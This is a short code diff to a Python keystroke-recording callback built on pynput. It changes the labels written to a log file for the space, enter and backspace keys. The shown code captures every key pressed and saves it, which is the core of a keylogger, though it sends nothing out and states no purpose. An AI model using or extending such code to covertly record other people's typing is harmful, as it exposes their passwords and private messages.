@@ -20,15 +20,16 @@ def on_press(key):
     except AttributeError:
         # print('special key {0} pressed'.format(key))
         if key == keyboard.Key.space:
-            f.write('|')
+            f.write(' (SPACE) ')
             f.close()
             return
         if key == keyboard.Key.enter:
+            f.write(' (ENTER) ')
             f.write(os.linesep)
             f.close()
             return
         if key == keyboard.Key.backspace:
-            f.write('<-')
+            f.write('<- (BS) ')
             f.close()
             return
         f.write(" --{0}--".format(key))
